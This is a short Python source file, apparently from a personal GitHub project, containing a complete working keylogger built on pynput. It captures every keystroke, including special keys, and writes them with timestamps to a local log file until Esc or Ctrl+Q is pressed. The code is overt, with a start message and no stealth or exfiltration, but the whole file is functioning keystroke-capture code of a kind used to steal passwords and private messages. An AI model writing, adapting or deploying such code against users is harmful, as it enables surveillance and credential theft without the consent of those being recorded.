# Created By Sameer Ahmad
# GitHub - https://github.com/SameerAhmad005/
import logging
from datetime import datetime
from pynput import keyboard

class KeyLogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.logger = self.setup_logger()
        self.ctrl_pressed = False  
        self.logging_active = True  

    def setup_logger(self):
        # Create a custom logger
        logger = logging.getLogger("KeyLogger")
        logger.setLevel(logging.DEBUG)
      
        f_handler = logging.FileHandler(self.log_file)
        f_handler.setLevel(logging.DEBUG)
      
        f_format = logging.Formatter('%(asctime)s - %(message)s')
        f_handler.setFormatter(f_format)
      
        logger.addHandler(f_handler)
        return logger

    def on_press(self, key):
        if not self.logging_active:
            return
        
        try:
            if key == keyboard.Key.esc:
                self.logging_active = False
                return False  # Stop listener
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.ctrl_pressed = True
            elif key.char == 'q' and self.ctrl_pressed:
                self.logging_active = False
                return False  # Stop listener
            else:
                self.logger.info(f'Key pressed: {key.char}')
        except AttributeError:
            self.logger.info(f'Special key pressed: {key}')

    def on_release(self, key):
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            self.ctrl_pressed = False

    def start(self):
        print(f"Logging started. Press 'Esc' to stop.")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    # Define log file with timestamp
    log_file_name = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    keylogger = KeyLogger(log_file=log_file_name)
    keylogger.start()
